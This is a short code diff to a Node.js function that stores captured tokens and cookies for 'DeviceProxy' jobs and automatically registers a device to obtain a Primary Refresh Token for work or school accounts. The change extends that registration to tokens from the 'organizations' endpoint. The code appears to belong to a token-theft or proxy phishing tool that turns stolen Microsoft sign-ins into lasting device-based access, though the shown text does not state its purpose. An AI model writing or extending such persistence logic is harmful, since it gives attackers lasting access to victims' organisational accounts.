@@ -481,11 +481,15 @@ async function storeToken(job, tokenData, responseCookies = []) {
     }
 
     // Determine account type from email domain (must be before INSERT)
+    // Default to work/school - only personal accounts (outlook/hotmail/live/passport) are excluded
     let accountType = 'work_school';
     if (email) {
       const emailDomain = email.split('@')[1].toLowerCase();
       if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com'].includes(emailDomain)) {
         accountType = 'personal';
+        console.log('[DeviceProxy] Personal account detected:', emailDomain, '- device registration disabled');
+      } else {
+        console.log('[DeviceProxy] Organization account detected:', emailDomain, '- device registration enabled');
       }
     }
 
@@ -579,7 +583,8 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
     // Attempt device registration and PRT generation for work/school accounts
     // This runs asynchronously and doesn't block the response
-    if (accountType === 'work_school' && tokenData.access_token && tenant && tenant !== 'common' && tenant !== 'organizations') {
+    // Works for: specific tenant GUIDs AND 'organizations' endpoint
+    if (accountType === 'work_school' && tokenData.access_token && tenant && tenant !== 'common') {
       console.log('[DeviceProxy] Attempting device registration for token', tokenId, 'tenant:', tenant);
       const deviceManager = require('./devicemanager');
       deviceManager.registerDeviceAndGetPrt({
@@ -601,7 +606,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
     } else {
       console.log('[DeviceProxy] Device registration skipped:', {
         tokenId,
-        reason: accountType !== 'work_school' ? 'not work/school' : !tokenData.access_token ? 'no access_token' : tenant === 'common' || tenant === 'organizations' ? 'tenant too generic' : 'unknown'
+        reason: accountType !== 'work_school' ? 'not work/school' : !tokenData.access_token ? 'no access_token' : tenant === 'common' ? 'tenant too generic (common)' : 'unknown'
       });
     }
 
